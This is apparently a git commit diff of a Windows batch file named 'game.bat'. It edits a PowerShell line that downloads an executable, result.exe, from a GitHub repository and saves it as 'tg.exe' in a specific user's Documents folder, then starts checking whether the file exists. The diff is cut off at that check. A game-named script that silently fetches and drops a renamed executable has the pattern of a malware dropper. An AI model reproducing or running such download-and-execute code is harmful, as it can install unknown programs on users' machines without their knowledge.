b25aa2bab6c91301f6f4f606afc7a0f9f314e1bf
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-07 20:54:00 +0330

    Update game.bat

--- game.bat
+++ game.bat
@@ -1,4 +1,4 @@
-PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\hhaam687\Documents\tg.exe'"
+PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\hhaam687\Documents\tg.exe'"
 
 :check
 	if "C:\Users\hhaam687\Documents\tg.exe" exist (
